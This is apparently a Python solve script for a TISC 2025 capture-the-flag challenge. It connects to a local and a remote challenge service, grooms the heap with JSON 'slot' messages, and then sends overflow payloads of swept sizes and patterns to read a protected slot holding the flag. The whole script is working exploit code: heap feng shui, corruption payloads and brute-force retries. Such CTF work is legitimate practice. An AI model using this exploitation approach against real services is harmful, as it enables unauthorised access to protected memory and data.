#!/usr/bin/env python3

import json
import socket
import time
import sys

HOST_LOCAL = ('localhost', 8000)
HOST_REMOTE = ('chals.tisc25.ctf.sg', 51728)

def send_cmd(host, port, obj, timeout=5):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(timeout)
    s.connect((host, port))
    try:
        data = (json.dumps(obj) + '\n').encode()
        s.sendall(data)
        resp = s.recv(8192)
        return resp
    finally:
        s.close()


def interactive_session(host, port, payload_then_probe):
    """Open one TCP session, send multiple lines, receive after each send."""
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(5)
    s.connect((host, port))
    try:
        out = []
        for obj in payload_then_probe:
            data = (json.dumps(obj) + '\n').encode()
            s.sendall(data)
            try:
                resp = s.recv(16384)
            except socket.timeout:
                resp = b''
            out.append(resp)
        return out
    finally:
        s.close()


def decode_flag_from_response(resp: bytes):
    # Try to extract [..] array and convert to ASCII
    try:
        if b'[' in resp and b']' in resp:
            start = resp.index(b'[')
            end = resp.index(b']', start) + 1
            arr_str = resp[start:end].decode(errors='ignore')
            # Use json to be safer than eval
            arr = json.loads(arr_str)
            s = ''.join(chr(x) for x in arr if isinstance(x, int) and 0 <= x < 256 and x != 0)
            return s
    except Exception:
        return None
    return None


def sweep_local():
    print('== Local sweep around size 44 ==')
    sizes = list(range(40, 49))
    for n in sizes:
        print(f'-- size {n} --')
        # One session: feng shui -> corruption -> probe slot 0
        feng = {"slot": 1, "data": [69, 2, 0]}
        corruption = {"slot": 1, "data": [i % 256 for i in range(n)]}
        probe = {"slot": 0}
        try:
            responses = interactive_session(HOST_LOCAL[0], HOST_LOCAL[1], [feng, corruption, probe])
        except Exception as e:
            print(f'Error size {n}: {e}')
            continue
        for i, r in enumerate(responses, 1):
            print(f'  resp{i}: {r[:200]!r}')
        flag = None
        if responses and (b'TISC{' in responses[-1] or b'Slot 0 contains:' in responses[-1]):
            flag = decode_flag_from_response(responses[-1])
        if flag:
            print(f'  decoded flag: {flag}')
            return n, flag
    return None, None


def try_remote(n_guess=44):
    print(f'== Remote attempt with size {n_guess} ==')
    feng = {"slot": 1, "data": [69, 2, 0]}

    # Candidate patterns for the 44-element corruption
    def patterns(n):
        return [
            ("seq", [i % 256 for i in range(n)]),
            ("zeros", [0] * n),
            ("ones", [1] * n),
            ("ff", [255] * n),
            ("fengrep", ([69, 2, 0] * (n // 3)) + [69, 2, 0][: n % 3]),
            ("tail1", [0] * (n - 1) + [1]),
            ("lead1", [1] + [0] * (n - 1)),
            ("alt01", [(i & 1) for i in range(n)]),
            ("wide", [0, 0, 0, 1] * (n // 4) + [0] * (n % 4)),
            ("de_be", [0xDE, 0xAD, 0xBE, 0xEF] * (n // 4) + [0xDE] * (n % 4)),
            ("neg1", [-1] * n),
            ("max32", [(2**31 - 1)] * n),
            ("u32max", [(2**32 - 1)] * n),
        ]

    for pname, pdata in patterns(n_guess):
        print(f'  -> pattern {pname}')
        corruption = {"slot": 1, "data": pdata}
        # Probe variants to tickle state machines
        probes = [
            {"slot": 0},
            {"slot": 0, "data": []},
            {"slot": 0, "data": [69, 2, 0]},
            {"slot": 0, "data": [0] * 4},
        ]
        try:
            # send feng shui, corruption, then a sequence of probes in one session
            msgs = [feng, corruption] + probes
            responses = interactive_session(HOST_REMOTE[0], HOST_REMOTE[1], msgs)
        except Exception as e:
            print(f'  Remote error on {pname}: {e}')
            continue
        for i, r in enumerate(responses, 1):
            print(f'  remote resp{i} ({pname}): {r[:200]!r}')
        # Check any of the probe responses for success
        for r in responses[-4:]:
            if b'TISC{' in r or b'Slot 0 contains:' in r:
                flag = decode_flag_from_response(r)
                if not flag and b'TISC{' in r:
                    print('  raw contains flag-like content')
                    print(r)
                    return True
                if flag:
                    print(f'  decoded flag: {flag}')
                    return True
    return False


def main():
    # quick local baseline
    try:
        baseline = send_cmd(HOST_LOCAL[0], HOST_LOCAL[1], {"slot": 1})
        print('local baseline slot 1:', baseline)
        denied = send_cmd(HOST_LOCAL[0], HOST_LOCAL[1], {"slot": 0})
        print('local baseline slot 0:', denied)
    except Exception as e:
        print('Local baseline failed:', e)

    n, flag = sweep_local()
    if flag:
        print('Local flag-like content acquired (likely fake flag). Proceeding remote...')
    else:
        print('Local sweep did not yield slot 0. Proceeding remote with n=44...')

    # Try remote size 44, if fails try a small sweep and then a wider sweep 36..56
    ok = try_remote(44)
    if not ok:
        for n_try in [43, 45, 46, 42, 47]:
            print(f'Fallback try with size {n_try}')
            if try_remote(n_try):
                ok = True
                break
    if not ok:
        for n_try in range(36, 57):
            print(f'Wider sweep size {n_try}')
            if try_remote(n_try):
                ok = True
                break

    if ok:
        print('SUCCESS: Remote returned flag-like output.')
        sys.exit(0)
    else:
        print('Remote attempts failed. Consider adjusting patterns or running deeper angr analysis.')
        sys.exit(1)

if __name__ == '__main__':
    main()
